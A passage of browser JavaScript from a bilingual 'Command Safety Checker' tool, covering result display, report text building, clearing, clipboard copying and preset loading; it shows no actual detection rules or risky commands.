    buildSaferSteps(result).forEach((step) => { const li = document.createElement("li"); li.textContent = step; saferStepsEl.appendChild(li); });
    if (result.normalized) { normalizedCmdEl.textContent = result.normalized; normalizedWrap.hidden = false; } else { normalizedCmdEl.textContent = ""; normalizedWrap.hidden = true; }
  }

  function handleAnalyze() {
    const normalized = trimLines(cmdInput?.value || "");
    if (!normalized) { showToast(t("コマンドを入力してください", "Please paste a command")); return; }
    renderResult(analyzeCommand(normalized));
  }
  function handleClear() {
    if (cmdInput) cmdInput.value = "";
    if (resultSection) resultSection.hidden = true;
    ["resultSummary","findings","saferSteps"].forEach((id) => { const el = $(id); if (el) el.innerHTML = ""; });
    if (normalizedCmdEl) normalizedCmdEl.textContent = "";
    if (normalizedWrap) normalizedWrap.hidden = true;
    window.__nw_lastResult = null;
    showToast(t("クリアしました", "Cleared"));
  }
  function buildReportText(result) {
    const lines = ["Command Safety Checker — Report", `OS: ${result.os}`, `Risk: ${result.risk}`, `High: ${result.counts.HIGH} / Medium: ${result.counts.MED} / Low: ${result.counts.LOW}`, "", "Findings:"];
    if (!result.findings.length) lines.push("- none (not a safety guarantee)");
    result.findings.forEach((item) => {
      lines.push(`- L${item.line}: [${item.rule.severity}] ${pick(item.rule.category)} — ${pick(item.rule.title)}`);
      lines.push(`  command: ${item.command}`);
      lines.push(`  why: ${pick(item.rule.why)}`);
      lines.push(`  check: ${pick(item.rule.check)}`);
      lines.push(`  alternative: ${pick(item.rule.alternative)}`);
    });
    lines.push("", "Safer steps:");
    buildSaferSteps(result).forEach((step) => lines.push(`- ${step}`));
    lines.push("", "Normalized command:", result.normalized || "");
    return lines.join("\n");
  }
  async function copyResults() {
    if (!window.__nw_lastResult) { showToast(t("まずチェックを実行してください", "Run a check first")); return; }
    const text = buildReportText(window.__nw_lastResult);
    try { await navigator.clipboard.writeText(text); showToast(t("コピーしました", "Copied")); }
    catch {
      const ta = document.createElement("textarea");
      ta.value = text; ta.style.position = "fixed"; ta.style.left = "-9999px"; document.body.appendChild(ta); ta.select();
      try { document.execCommand("copy"); showToast(t("コピーしました", "Copied")); }
      catch { showToast(t("コピーに失敗しました", "Copy failed")); }
      finally { document.body.removeChild(ta); }
    }
  }

  analyzeBtn?.addEventListener("click", handleAnalyze);
  clearBtn?.addEventListener("click", handleClear);
  copyBtn?.addEventListener("click", copyResults);
  cmdInput?.addEventListener("keydown", (event) => { if ((event.ctrlKey || event.metaKey) && event.key === "Enter") handleAnalyze(); });
  document.addEventListener("click", (event) => {
    const b = event.target.closest("[data-preset]");
    if (!b) return;
    if (cmdInput) cmdInput.value = b.dataset.preset || "";
    if (b.dataset.os && osSelect) osSelect.value = b.dataset.os;
    cmdInput?.focus();
  });
})();
